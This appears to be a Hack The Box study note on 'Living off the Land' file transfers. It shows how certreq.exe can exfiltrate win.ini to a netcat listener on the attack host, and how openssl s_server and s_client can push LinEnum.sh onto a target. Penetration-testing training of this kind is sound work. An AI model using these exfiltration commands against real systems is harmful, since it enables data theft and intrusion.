# 🏨 Living off The Land

There are currently two websites that aggregate information on Living off the Land binaries:

* [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
* [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

### LOLBAS

<figure><img src="../../../.gitbook/assets/image (1443).png" alt=""><figcaption></figcaption></figure>

We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

**Upload win.ini to our Attackbox**

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

And in our netcat session ->

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
<SNIP>
```

If we have an error, the version we are using may not contain the `-Post` parameter. We can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

### GTFOBins

<figure><img src="../../../.gitbook/assets/image (1444).png" alt=""><figcaption></figcaption></figure>

We need to create a certificate in our pwnbox and start a server in our Pwnbox.

Cert ->

```shell-session
ElFelixi0@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Server up ->

```shell-session
ElFelixi0@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Now we need to download the file from the target machine ->

```shell-session
ElFelixi0@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
